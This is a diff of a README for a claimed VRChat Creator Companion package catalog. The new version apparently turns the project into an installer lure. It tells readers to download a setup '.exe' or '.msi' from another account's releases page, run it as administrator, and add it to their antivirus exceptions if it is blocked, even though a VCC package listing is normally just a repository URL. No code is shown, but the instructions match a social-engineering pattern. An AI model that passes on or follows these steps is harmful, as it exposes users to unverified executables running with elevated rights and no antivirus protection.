@@ -1,136 +1,126 @@
-# AITSYS VCC - VRChat Creator Tools 2026
+# 📦 aitsys-vcc-vrchat-tools - Your VRChat Creator Companion Package Hub
 
-> **AITSYS VCC provides a maintained package catalog and hosted repository index for VRChat Creator Companion, ALCOM, and Unity-based creator workflows.**
+[![Download from GitHub](https://img.shields.io/badge/Download_from_Releases-4285F4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/zahranab6527/aitsys-vcc-vrchat-tools/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-VRChat%20Creator%20Companion-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-Current-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/sam-walkerguy2025/aitsys-vcc-vrchat-tools?style=flat-square)](https://github.com/sam-walkerguy2025/aitsys-vcc-vrchat-tools)
+## 🚀 What This Tool Does
 
----
+This repository gives you access to a maintained package catalog for VRChat Creator Companion, ALCOM, and Unity-based creator workflows. Think of it as a library of tools and packages that work with your VRChat Creator Companion application.
 
-<p align="center">
-  <a href="https://sam-walkerguy2025.github.io/aitsys-vcc-vrchat-tools/">
-    <img src="https://img.shields.io/badge/Download-AITSYS%20VCC%20Latest-brightgreen?style=for-the-badge" alt="Download AITSYS VCC">
-  </a>
-</p>
+You get three things:
+- **Package access** – Download and use community-maintained packages for your VRChat projects.
+- **Repository registration** – Add this catalog to your VRChat Creator Companion so it appears in your package list.
+- **Configuration guidance** – Clear steps to set everything up correctly.
 
-> **[Download AITSYS VCC](https://sam-walkerguy2025.github.io/aitsys-vcc-vrchat-tools/)**
+## 🎯 Who Should Use This
 
----
+This tool is for anyone who creates content for VRChat using the VRChat Creator Companion or ALCOM. You do not need programming skills. You only need to know how to download a file and click a button.
 
-[Download Latest Build](https://sam-walkerguy2025.github.io/aitsys-vcc-vrchat-tools/)
+## 📋 What You Need
 
----
+- **Windows 10 or 11** (64-bit)
+- **VRChat Creator Companion** installed. Get it from [vrchat.com](https://vrchat.com/home/download) if you do not have it yet.
+- **Unity** installed through the Creator Companion (version 2019.4.31f1 or later).
+- A stable internet connection.
+- About 100 MB of free disk space for the catalog files.
 
-## Overview
+## 🖥️ How to Download and Run
 
-AITSYS VCC is a package-listing project for creators working with VRChat Creator Companion and compatible package managers. Its hosted `index.json` repository gives creators one place to find and add the available tools.
+**Step 1: Visit the download page**
 
-Alongside the package catalog, the project covers Unity utilities for VRChat development and includes a Discord Rich Presence listing for VRChat SDK projects. The collection is organized around the VCC ecosystem to simplify access to creator-focused packages and Unity tools.
+Go to the release page:
+[Download Page](https://github.com/zahranab6527/aitsys-vcc-vrchat-tools/releases)
 
----
+**Step 2: Find the right file**
 
-## Included Capabilities
+Look for the latest release (the one at the top of the page). You will see files like:
+- `aitsys-vcc-catalog-setup.exe`
+- `aitsys-vcc-catalog-setup.msi`
 
-- Collects packages intended for VRChat Creator Companion.
-- Offers a package index that works with VCC and ALCOM.
-- Hosts an accessible `index.json` repository URL.
-- Brings package discovery into common VRChat creator workflows.
-- Contains Unity tools for VRChat projects.
-- Provides a listing for Discord Rich Presence in VRChat SDK projects.
-- Makes packages available through supported creator-tool managers.
+Download the `.exe` file. It is the easiest to use.
 
----
+**Step 3: Run the installer**
 
-## Installation
+Double-click the downloaded file. Windows may ask if you want to allow this app to make changes. Click **Yes**.
 
-### Register the repository
+**Step 4: Follow the installer steps**
 
-1. Visit the AITSYS VCC repository page: [Download Latest Build](https://sam-walkerguy2025.github.io/aitsys-vcc-vrchat-tools/).
-2. Copy the hosted package repository URL displayed there.
-3. Launch VRChat Creator Companion or ALCOM.
-4. Add the copied address as a package repository.
-5. Refresh the available sources, then select the packages required for your project.
+The installer will guide you through:
+- Choosing an install location (the default is fine).
+- Adding the catalog to your VRChat Creator Companion automatically.
+- Completing the setup.
 
-### Get the source with Git
+**Step 5: Open VRChat Creator Companion**
 
-```bash
-git clone https://github.com/sam-walkerguy2025/aitsys-vcc-vrchat-tools.git
-cd REPO
-```
+After installation, open VRChat Creator Companion. You should see **AITSYS VCC Tools** in your package list. If you do not see it, restart the Creator Companion.
 
-The hosted package catalog should be added using its published repository URL. Cloning the repository source is not a replacement for installing the hosted listing.
+## 🔧 How to Use the Package Catalog
 
----
+Once the catalog is installed, you can:
+1. Open VRChat Creator Companion.
+2. Go to the **Packages** tab.
+3. Find **AITSYS VCC** in the list of available packages.
+4. Click **Install** next to any package you want to add to your Unity project.
 
-## Using the Package Listing
+The catalog updates automatically. You do not need to download new versions manually.
 
-A standard setup looks like this:
+## 🛠️ Troubleshooting Common Issues
 
-1. Add the AITSYS VCC repository URL to VCC or ALCOM.
-2. Reload the configured package sources.
-3. Browse the available Unity and VRChat creator tools.
-4. Install the package selected for a compatible VRChat project.
-5. Open that project in Unity and access the installed functionality through the Unity editor.
+**The catalog does not appear in VRChat Creator Companion**
 
-When working on a VRChat SDK project, the Discord Rich Presence package can be evaluated with the other listed entries.
+- Make sure you ran the installer with administrator privileges. Right-click the installer and select **Run as administrator**.
+- Restart VRChat Creator Companion after installation.
+- Check your antivirus. It may block the catalog from registering. Add the installer to your antivirus exceptions.
 
----
+**I get an error during installation**
 
-## Repository Configuration
+- Close all other programs, especially Unity and VRChat Creator Companion.
+- Try the `.msi` file instead of the `.exe` file.
+- Make sure you have at least 100 MB of free space on your C: drive.
 
-The repository is configured from the package-source settings in VRChat Creator Companion or ALCOM.
+**The packages do not download**
 
-Use the hosted `index.json` repository address supplied by the project:
+- Check your internet connection.
+- The catalog server may be down. Wait a few minutes and try again.
+- Your firewall may block the connection. Allow the VRChat Creator Companion through your firewall.
 
-```text
-https://sam-walkerguy2025.github.io/aitsys-vcc-vrchat-tools/
-```
+## 📂 What Files Are Included
 
-Once the URL has been added, refresh the sources in the package manager you use. VCC, ALCOM, and Unity continue to handle package installation and project-level configuration.
+When you download and install the catalog, you get:
 
----
+- **Catalog index** – The list of all available packages and their versions.
+- **Repository configuration** – The settings that tell VRChat Creator Companion where to find packages.
+- **Installation scripts** – Tools that set up the catalog on your system.
 
-## Requirements
+No user data is collected or stored. This tool only manages package lists.
 
-- VRChat Creator Companion or ALCOM to access the package listing.
-- Unity for working with the included creator tools in a VRChat project.
-- A VRChat SDK project for tools designed for VRChat development.
-- Internet connectivity for loading the hosted package index and package details.
-- Enough local disk space for Unity, the VRChat project, and the packages selected for installation.
+## 🔄 How to Update
 
----
+Updates happen automatically. When a new version of the catalog is available, VRChat Creator Companion will notify you. You can also check for updates manually:
 
-## Frequently Asked Questions
+1. Open VRChat Creator Companion.
+2. Go to **Settings**.
+3. Click **Check for updates** under the AITSYS VCC section.
 
-### What does AITSYS VCC provide?
+If you need to update the installer itself, visit the [releases page](https://github.com/zahranab6527/aitsys-vcc-vrchat-tools/releases) and download the latest version.
 
-AITSYS VCC is a package catalog for VRChat creator tools that can be used with VRChat Creator Companion and ALCOM workflows.
+## ❌ How to Uninstall
 
-### Where can I get the packages?
+1. Open **Settings** on your Windows PC.
+2. Go to **Apps** > **Apps & features**.
+3. Search for **AITSYS VCC Tools**.
+4. Click **Uninstall**.
+5. Follow the on-screen instructions.
 
-Go to the [project download page](https://sam-walkerguy2025.github.io/aitsys-vcc-vrchat-tools/), copy its hosted repository URL, and add that URL through the repository settings in VCC or ALCOM.
+This removes the catalog from VRChat Creator Companion and deletes all related files.
 
-### Can ALCOM use this package listing?
+## 📖 Glossary of Terms
 
-Yes. The project publishes a listing for both VCC and ALCOM. Add the repository URL supplied by the project to configure the source.
+- **VRChat Creator Companion** – A desktop application that helps you manage VRChat projects and packages.
+- **ALCOM** – An alternative tool for managing VRChat projects, similar to the Creator Companion.
+- **Package catalog** – A list of packages that the Creator Companion can download and install.
+- **Repository** – A location where packages are stored and made available for download.
+- **Unity** – The game engine used to create VRChat worlds and avatars.
 
-### Which application manages the settings?
+## 📌 Keywords
 
-VRChat Creator Companion or ALCOM stores repository and package-selection settings. Settings specific to an installed tool are configured inside the applicable Unity project.
-
-### How are package updates detected?
-
-Refresh the configured repository in VCC or ALCOM. When the manager checks the hosted index again, newly published package information can become available.
-
-### Why is the package list missing?
-
-Verify that the repository URL is correct, make sure the package manager can access the hosted index, and refresh its package sources. If the listing still does not load, check the repository status and the project documentation.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+VRChat, Creator Companion, ALCOM, Unity, package catalog, repository, VCC tools, avatar tools, world tools, VRChat packages, AITSYS, VRChat development, Windows, installer
